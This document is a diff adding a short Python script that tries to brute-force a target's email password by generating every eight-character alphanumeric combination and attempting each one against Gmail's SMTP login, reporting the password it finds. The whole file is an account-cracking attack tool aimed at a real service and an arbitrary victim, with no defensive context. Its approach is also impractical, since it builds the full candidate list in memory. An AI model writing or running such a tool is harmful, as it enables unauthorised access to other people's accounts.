@@ -1,0 +1,29 @@
+import smtplib
+from itertools import product
+from string import ascii_lowercase, ascii_uppercase, digits
+
+def main():
+    email = input("Enter the target email: ")
+    password_list = generate_password_list()
+
+    for password in password_list:
+        if login(email, password):
+            print("[+] Password found: {}".format(password))
+            break
+
+def generate_password_list():
+    chars = ascii_lowercase + ascii_uppercase + digits
+    return [''.join(i) for i in product(chars, repeat=8)]
+
+def login(email, password):
+    try:
+        server = smtplib.SMTP('smtp.gmail.com', 587)
+        server.starttls()
+        server.login(email, password)
+        server.quit()
+        return True
+    except smtplib.SMTPAuthenticationError:
+        return False
+
+if __name__ == "__main__":
+    main()
